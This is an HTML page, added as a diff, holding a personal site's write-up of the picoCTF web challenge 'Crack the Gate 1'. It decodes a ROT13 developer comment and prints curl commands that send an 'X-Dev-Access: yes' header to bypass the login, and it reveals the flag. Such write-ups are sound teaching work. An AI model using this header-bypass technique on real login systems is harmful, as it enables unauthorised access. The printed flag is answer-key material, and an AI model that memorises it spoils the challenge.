@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crack the Gate 1 | Amidst CTF Write-up</title>
+  <link rel="icon" type="image/png" href="../assets/kafka-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+  <nav class="navbar scrolled" id="navbar">
+    <div class="nav-container">
+      <a href="../index.html#home" class="nav-logo">
+        <img src="../assets/kafka-icon.png" alt="Logo" class="nav-icon">
+        <span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span>
+      </a>
+      <ul class="nav-menu">
+        <li><a href="../index.html#home">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#skills">Skills</a></li>
+        <li><a href="../index.html#certifications">Certs</a></li>
+        <li><a href="../index.html#ctf" class="active">CTF</a></li>
+        <li><a href="../index.html#bugbounty">Bug Bounty</a></li>
+        <li><a href="../index.html#labs">Labs</a></li>
+        <li><a href="../index.html#contact">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <section class="writeup-header">
+    <div class="container">
+      <a href="../index.html#ctf" class="writeup-back"><i class="fas fa-arrow-left"></i> Back to Write-ups</a>
+      <h1>Crack the Gate 1</h1>
+      <div class="writeup-meta">
+        <span class="ctf-category web">Web Exploitation</span>
+        <span class="ctf-difficulty easy">Easy</span>
+        <span style="color: var(--text-muted); font-size: 0.85rem;"><i class="fas fa-flag" style="margin-right:5px;"></i>picoCTF</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="writeup-body">
+    <div class="container">
+      <div class="writeup-content">
+        <h2 id="challenge-info">Challenge Info</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>Crack the Gate 1</td>
+</tr>
+<tr>
+<td>Category</td>
+<td>Web Exploitation</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>picoCTF</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>http://amiable-citadel.picoctf.net:50016/</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Description:</strong>
+We're in the middle of an investigation. One of our persons of interest, a CTF player, is believed to be hiding sensitive data inside a restricted web portal. We've uncovered the email address he uses to log in: <code>ctf-player@picoctf.org</code>. Unfortunately, we don't know the password, and the usual guessing techniques haven't worked. But something feels off — it's almost like the developer left a secret way in.</p>
+<hr />
+<h2 id="solution">Solution</h2>
+<h3 id="step-1-view-the-page-source">Step 1: View the Page Source</h3>
+<p>The first thing to do in any web challenge is to look at the source code. You can do this by right-clicking the page and selecting "View Page Source", or by using <code>curl</code>:</p>
+<pre><code class="language-bash">curl -s http://amiable-citadel.picoctf.net:50016/
+</code></pre>
+<p>Inside the HTML, there is a suspicious comment hidden near the top of the <code>&lt;body&gt;</code> tag:</p>
+<pre><code class="language-html">&lt;!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre &quot;K-Qri-Npprff: lrf&quot; --&gt;
+&lt;!-- Remove before pushing to production! --&gt;
+</code></pre>
+<p>The second comment says "Remove before pushing to production!" — this tells us the developer accidentally left something behind that we're not supposed to see.</p>
+<hr />
+<h3 id="step-2-decode-the-hidden-message-rot13">Step 2: Decode the Hidden Message (ROT13)</h3>
+<p>The first comment looks like random characters, but it's actually encoded using <strong>ROT13</strong> — a simple cipher that shifts every letter by 13 positions in the alphabet (A becomes N, B becomes O, and so on).</p>
+<p>You can decode it using the <code>tr</code> command in Linux:</p>
+<pre><code class="language-bash">echo &quot;ABGR: Wnpx - grzcbenel olcnff: hfr urnqre K-Qri-Npprff: lrf&quot; | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+</code></pre>
+<p>Or use any online ROT13 decoder (like rot13.com).</p>
+<p><strong>Decoded result:</strong></p>
+<blockquote>
+<p>NOTE: Jack - temporary bypass: use header X-Dev-Access: yes</p>
+</blockquote>
+<p>Now we know: a developer named <strong>Jack</strong> left a backdoor. By adding the HTTP header <code>X-Dev-Access: yes</code> to our request, we can skip the password check entirely.</p>
+<hr />
+<h3 id="step-3-login-using-the-backdoor-header">Step 3: Login Using the Backdoor Header</h3>
+<p>From the JavaScript code in the page source, we can see that the login form sends a <code>POST</code> request to <code>/login</code> with JSON data containing <code>email</code> and <code>password</code>.</p>
+<p>We send the request with <code>curl</code>, adding the secret header:</p>
+<pre><code class="language-bash">curl -s -X POST http://amiable-citadel.picoctf.net:50016/login \
+  -H &quot;Content-Type: application/json&quot; \
+  -H &quot;X-Dev-Access: yes&quot; \
+  -d '{&quot;email&quot;:&quot;ctf-player@picoctf.org&quot;,&quot;password&quot;:&quot;anything&quot;}'
+</code></pre>
+<p>The password can be literally anything — the backdoor header bypasses authentication completely.</p>
+<p><strong>Server response:</strong></p>
+<pre><code class="language-json">{
+  &quot;success&quot;: true,
+  &quot;email&quot;: &quot;ctf-player@picoctf.org&quot;,
+  &quot;firstName&quot;: &quot;pico&quot;,
+  &quot;lastName&quot;: &quot;player&quot;,
+  &quot;flag&quot;: &quot;picoCTF{brut4_f0rc4_49d1d186}&quot;
+}
+</code></pre>
+<hr />
+<h2 id="flag">Flag</h2>
+<pre><code>picoCTF{brut4_f0rc4_49d1d186}
+</code></pre>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li>
+<p><strong>Always view the page source.</strong> Developers sometimes leave comments, debug info, or credentials hidden in HTML comments that are invisible on the rendered page but fully readable in the source code.</p>
+</li>
+<li>
+<p><strong>Recognize common encodings.</strong> ROT13 is one of the most common light obfuscation methods used in CTFs. If you see text that looks like scrambled English letters, try ROT13 first.</p>
+</li>
+<li>
+<p><strong>Custom HTTP headers can be a backdoor.</strong> In this challenge, the developer added a debug header (<code>X-Dev-Access: yes</code>) that completely bypasses login authentication. In real-world security, always check for hidden or undocumented headers.</p>
+</li>
+<li>
+<p><strong>Read the JavaScript.</strong> The login form's JS code revealed the API endpoint (<code>/login</code>) and the expected request format (JSON with <code>email</code> and <code>password</code>), which was essential for crafting the correct <code>curl</code> command.</p>
+</li>
+</ol>
+      </div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <p class="footer-logo"><span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span></p>
+        <p class="footer-copy">&copy; 2026 Amidst. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
